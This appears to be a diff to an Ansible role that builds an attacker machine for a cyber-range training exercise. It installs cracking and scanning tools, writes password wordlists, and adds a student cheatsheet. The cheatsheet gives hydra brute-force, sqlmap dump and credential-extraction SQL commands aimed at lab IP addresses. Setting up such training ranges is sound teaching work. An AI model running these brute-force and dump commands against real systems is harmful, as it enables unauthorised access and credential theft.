@@ -1,4 +1,11 @@
 ---
+# roles/kali-attacker/tasks/main.yml
+# Merged from original role + ejabberd/XMPP attack additions.
+# Original: nmap, hydra, medusa, sqlmap, mongosh, mysql, john, rockyou, hosts, README
+# Added   : telnet, passlib, slixmpp, xmpp_enum.py, passlist.txt,
+#           ejabberd-passwords.txt, ejabberd entries in hosts + README
+
+# ── Package cache ─────────────────────────────────────────────
 - name: Update apt cache
   apt:
     update_cache: yes
@@ -10,6 +17,7 @@
       - curl
     state: present
 
+# ── MongoDB repo (original shell method preserved) ────────────
 - name: Add MongoDB GPG key
   shell: |
     curl -fsSL https://www.mongodb.org/static/pgp/server-7.0.asc | \
@@ -27,9 +35,11 @@
   apt:
     update_cache: yes
 
+# ── All attack tools ──────────────────────────────────────────
 - name: Install attack tools
   apt:
     pkg:
+      # ── original tools ──────────────────────────────────────
       - nmap
       - hydra
       - medusa
@@ -41,65 +51,200 @@
       - wget
       - netcat-openbsd
       - john
+      # ── added for ejabberd / Telnet levels ──────────────────
+      - telnet                   # Telnet brute-force level
+      - python3-pip
+      - python3-dev
+      - libssl-dev
+      - hashcat                  # SCRAM hash cracking
     state: present
 
+# ── Python XMPP library for ejabberd enumeration ─────────────
+- name: Install slixmpp Python XMPP library
+  pip:
+    name:
+      - slixmpp
+      - xmpppy
+    executable: pip3
+    extra_args: "--break-system-packages"
+
+# ── Wordlists ─────────────────────────────────────────────────
 - name: Ensure wordlists directory exists
   file:
     path: /usr/share/wordlists
     state: directory
-    mode: '0755'
+    mode: "0755"
 
 - name: Download rockyou wordlist
   get_url:
     url: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
     dest: /usr/share/wordlists/rockyou.txt
-    mode: '0644'
+    mode: "0644"
 
+- name: Create passlist.txt for Telnet / alice brute-force level
+  copy:
+    dest: /home/debian/passlist.txt
+    owner: debian
+    group: debian
+    mode: "0644"
+    content: |
+      password
+      123456
+      admin
+      letmein
+      welcome
+      alice123
+      password1
+      qwerty
+      sunshine
+      monkey
+      dragon
+      master
+      abc123
+      pass123
+      secret
+      iloveyou
+      football
+      princess
+      superman
+
+- name: Create ejabberd-passwords.txt for ejabberd admin brute-force level
+  copy:
+    dest: /home/debian/ejabberd-passwords.txt
+    owner: debian
+    group: debian
+    mode: "0644"
+    content: |
+      password
+      admin
+      Admin@1234
+      admin123
+      ejabberd
+      jabber
+      xmpp123
+      12345678
+      password1
+      letmein
+      welcome1
+      root
+      toor
+      changeme
+      P@ssw0rd
+      EjabberdDB@123
+      RootPass@123
+
+# ── /etc/hosts aliases (original + ejabberd-server added) ─────
 - name: Add host aliases for easy access
   blockinfile:
     path: /etc/hosts
     block: |
-      192.168.20.5 server
-      192.168.30.5 windows-host
-      192.168.40.5 db-server
+      192.168.20.5  server
+      192.168.20.10 ejabberd-server
+      192.168.30.5  windows-host
+      192.168.40.5  db-server
 
+# ── Exercise directory and cheatsheet ─────────────────────────
 - name: Create attacker home directory structure
   file:
     path: /home/debian/exercise
     state: directory
     owner: debian
-    mode: '0755'
+    mode: "0755"
 
 - name: Place attack cheatsheet for students
   copy:
     dest: /home/debian/exercise/README.txt
     owner: debian
-    mode: '0644'
+    mode: "0644"
     content: |
-      === CyberRangeCZ Attack Exercise ===
+      =============================================
+        CyberRangeCZ Attack Exercise — Cheatsheet
+      =============================================
 
-      Targets:
-        db-server (192.168.40.5)
-          - MySQL   : port 3306   (user: dbuser, try brute-force)
-          - MongoDB : port 27017  (unauthenticated — enumerate directly)
+      TARGETS
+      -------
+      server          192.168.20.5   Telnet :2323
+      ejabberd-server 192.168.20.10  XMPP :5222, Admin :5280, MySQL :3306, HTTP :80
+      db-server       192.168.40.5   MySQL :3306, MongoDB :27017
 
-      Useful commands:
-
-      --- Network Recon ---
+      ── Network Recon ──────────────────────────────────────────
       nmap -sV -p 3306,27017 192.168.40.5
+      nmap -sV -p 5222,5280,3306 192.168.20.10
 
-      --- MySQL Brute-force ---
+      ── MySQL Brute-force (db-server) ──────────────────────────
       hydra -l dbuser -P /usr/share/wordlists/rockyou.txt mysql://192.168.40.5
 
-      --- MySQL Manual Access ---
+      ── MySQL Manual Access (db-server) ────────────────────────
       mysql -h 192.168.40.5 -u dbuser -p
       > USE company;
       > SELECT * FROM employees;
 
-      --- MongoDB (no auth) ---
+      ── MongoDB (no auth) ──────────────────────────────────────
       mongosh --host 192.168.40.5 --port 27017
       > use records
       > db.flags.find()
 
-      --- SQLMap against MySQL ---
+      ── SQLMap against MySQL ────────────────────────────────────
       sqlmap -d "mysql://dbuser:PASSWORD@192.168.40.5/company" --dump
+
+      ── Telnet Brute-force ──────────────────────────────────────
+      hydra -l alice -P /home/debian/passlist.txt telnet://192.168.20.5 -s 2323
+      telnet 192.168.20.5 2323
+
+      ── Ejabberd Admin Panel Brute-force ───────────────────────
+      hydra -l admin@192.168.20.10 -P /home/debian/ejabberd-passwords.txt \
+            -s 5280 192.168.20.10 http-get /admin
+      firefox http://192.168.20.10:5280/admin
+
+      ── Ejabberd MySQL Dump ─────────────────────────────────────
+      mysql -h 192.168.20.10 -u ejabberd -p
+      > USE ejabberd;
+      > SELECT username, password FROM users;
+
+      ── Ejabberd Flag Capture ───────────────────────────────────
+      ssh contestant@192.168.20.10
+      sudo grep FLAG /etc/ejabberd/ejabberd.yml
+
+      ── XMPP Service Probe ─────────────────────────────────────
+      python3 /home/debian/xmpp_enum.py 192.168.20.10
+      nmap -p 5222 --script xmpp-info 192.168.20.10
+
+      =============================================
+
+# ── XMPP helper script ────────────────────────────────────────
+- name: Deploy XMPP service probe script
+  copy:
+    dest: /home/debian/xmpp_enum.py
+    owner: debian
+    group: debian
+    mode: "0755"
+    content: |
+      #!/usr/bin/env python3
+      """
+      XMPP service probe — checks if ejabberd is alive and reads banner.
+      Usage: python3 xmpp_enum.py <host> [port]
+      Example: python3 xmpp_enum.py 192.168.20.10
+      """
+      import sys
+      import socket
+
+      def probe(host, port=5222):
+          try:
+              s = socket.create_connection((host, port), timeout=5)
+              s.send(
+                  f'<?xml version="1.0"?>'
+                  f'<stream:stream to="{host}" '
+                  f'xmlns="jabber:client" '
+                  f'xmlns:stream="http://etherx.jabber.org/streams" '
+                  f'version="1.0">'.encode()
+              )
+              resp = s.recv(4096).decode(errors="ignore")
+              s.close()
+              print(f"[+] XMPP service UP on {host}:{port}")
+              print(f"    Banner: {resp[:300]}")
+          except Exception as e:
+              print(f"[-] Could not connect to {host}:{port} — {e}")
+
+      host = sys.argv[1] if len(sys.argv) > 1 else "192.168.20.10"
+      port = int(sys.argv[2]) if len(sys.argv) > 2 else 5222
+      probe(host, port)
